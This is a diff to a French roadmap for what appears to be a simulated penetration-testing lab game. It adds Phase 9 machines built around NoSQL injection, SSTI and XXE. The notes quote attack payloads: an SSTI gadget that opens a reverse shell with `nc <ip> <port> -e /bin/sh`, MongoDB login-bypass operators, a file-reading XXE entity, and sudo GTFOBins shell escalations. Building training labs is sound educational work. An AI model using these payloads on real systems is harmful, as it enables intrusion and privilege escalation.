@@ -13,16 +13,20 @@ indices à paliers).
 
 ## 🎯 Prochaines priorités (recommandation, ordre effort/valeur croissant)
 
-Vue synthétique de l'état du projet : **toutes les phases planifiées (1 à 8) sont désormais
-terminées** — 14 machines, i18n FR/EN complet, solveur automatique, parser shell, éditeur/générateur
+Vue synthétique de l'état du projet : **toutes les phases planifiées (1 à 9) sont désormais
+terminées** — 17 machines, i18n FR/EN complet, solveur automatique, parser shell, éditeur/générateur
 de machines, attack graph, Blue Team, firewall, phishing, reverse engineering, et la dernière
-vague en date (Phase 8) : SSRF vers métadonnées cloud, rôle IAM assumable et capabilities Linux
-(PARALLAX), puis authentification JWT "alg:none" et vim GTFOBins (SENTRY). Aucun chantier n'est
-bloqué en cours ; les prochaines pistes viendraient d'une nouvelle vague de contenu (Phase 9)
-plutôt que de dette technique.
+vague en date (Phase 9) : injection **NoSQL** sur une API de login MongoDB (AETHER), **SSTI**
+(Server-Side Template Injection façon Jinja2) menant à une RCE via callback `nc` (ECLIPSE), et
+**XXE** (XML External Entity) menant à une divulgation de fichier (VESPER) — trois familles de
+vulnérabilité inédites dans le lab, chacune avec son propre mécanisme moteur générique
+(`machine.nosqli`, `machine.ssti`, `machine.xxe`) réutilisable par de futures machines. Aucun
+chantier n'est bloqué en cours ; les prochaines pistes viendraient d'une nouvelle vague de contenu
+(Phase 10) plutôt que de dette technique.
 
 > ✅ **Phase 2 entièrement terminée** (STRATUS cloud / NEXUS webshell / CITADEL pivot / TEMPEST cloud-RCE, 8 → **12
-> machines**, puis **13** avec PARALLAX et **14** avec SENTRY en Phase 8). **Phase 3 entièrement
+> machines**, puis **13** avec PARALLAX et **14** avec SENTRY en Phase 8, puis **15** avec AETHER et
+> **16** avec ECLIPSE et **17** avec VESPER en Phase 9). **Phase 3 entièrement
 > terminée** : solveur automatique (`tools/solve.js`), extraction JSON pure des machines
 > (`tools/export-machines-json.js` → `machines.json`), **vrai parser shell** (`$VAR`, `$(...)`,
 > redirections `2>`/`&>`) et **i18n FR/EN** complet, tous livrés.
@@ -459,6 +463,45 @@ future revue si tu valides le principe.
       ':!/bin/sh'`, type `sudo-direct`, aucun changement moteur nécessaire). Testé dans `tests/run.js`
       (refus sans en-tête, refus si rôle insuffisant, refus si l'algorithme n'est pas `none`, encodage
       manuel des segments vérifié, exploitation complète) et rejoué par `tools/solve.js` (14/14 machines).
+
+---
+
+## 🧬 Phase 9 — Nouvelles familles de vulnérabilités (vague 5)
+
+- [x] **Injection NoSQL** — nouvelle machine **AETHER** (15ᵉ machine, insérée entre GLACIER et
+      STRATUS) : une API de ticketing MongoDB (`machine.nosqli = { path, injectionRegex, successBody,
+      failBody }`, même mécanique que `machine.sqli` mais pensée pour un body JSON) accepte un
+      opérateur de requête MongoDB (`$ne`, `$gt`, `$exists`, `$regex`, `$in`) à la place d'une
+      chaîne littérale dans le champ mot de passe — le contrôle d'authentification saute
+      entièrement. Déclenché par `curl -d '<json>' <url>`, aucun changement de détection du POST
+      dans `cmdCurl` au-delà d'un nouveau bloc dédié (avant le bloc `sqli` existant, pour ne pas le
+      perturber). Côté privesc, premier usage de **taskset** en GTFOBins (`sudo taskset 1 /bin/sh`,
+      `exploit.bin` à deux mots pour rester dans le DSL `spawn` existant sans toucher `exploitMatches`).
+      Testé dans `tests/run.js` (payload sans opérateur refusé, bypass accepté, exploitation
+      complète) et rejoué par `tools/solve.js` (15/15 puis 16/16 machines).
+- [x] **SSTI (Server-Side Template Injection)** — nouvelle machine **ECLIPSE** (16ᵉ machine, juste
+      après AETHER) : un générateur de rapports (`machine.ssti = { path, param, pocRegex,
+      pocResponse, injectRegex, user }`) interpole un paramètre directement dans un moteur de
+      templates façon Jinja2. `curl "<url>?name={{7*7}}"` confirme l'évaluation côté serveur
+      (`pocRegex`, réponse `49`), puis un gadget `os.popen('nc <ip> <port> -e /bin/sh').read()`
+      entre doubles accolades déclenche le même mécanisme de callback `nc` que `machine.altAccess`
+      (parsing IP/port depuis le payload joueur, vérification de l'IP attaquant et du port en
+      écoute) — nouveau bloc dans `cmdCurl`, symétrique à celui du SSRF/altAccess. Côté privesc,
+      premier usage de **nice** en GTFOBins (`sudo nice /bin/sh`, DSL `spawn` standard). Accès
+      100% par reverse shell (pas de creds SSH primaires, comme NEXUS). Testé dans `tests/run.js`
+      (PoC de calcul confirmée, callback refusé sans listener, IP de callback incorrecte rejetée,
+      exploitation complète) et rejoué par `tools/solve.js` (16/16 machines).
+- [x] **XXE (XML External Entity)** — nouvelle machine **VESPER** (17ᵉ machine, insérée entre
+      CITADEL et TEMPEST) : un service d'import de documents (`machine.xxe = { path, secretPath,
+      entityRegex, successBody, notFoundBody, failBody }`) résout une entité externe `SYSTEM
+      "file://<chemin>"` déclarée dans la DTD d'un document XML posté en brut (`curl -d '<xml...>'`).
+      Détection fidèle au principe des autres vecteurs "POST + regex" (comme `sqli`/`nosqli`) : le
+      chemin capturé par `entityRegex` doit correspondre exactement au fichier secret de la machine
+      pour fuiter les identifiants SSH, sinon un message distinct signale une entité détectée mais un
+      fichier introuvable (nouveau à trois issues, contre deux pour `sqli`/`nosqli`). Côté privesc,
+      premier usage de **setsid** en GTFOBins (`sudo setsid /bin/sh`, DSL `spawn` standard). Testé
+      dans `tests/run.js` (payload sans entité refusé, entité valide mais mauvais fichier refusée,
+      exploitation complète) et rejoué par `tools/solve.js` (17/17 machines).
 
 ---
 
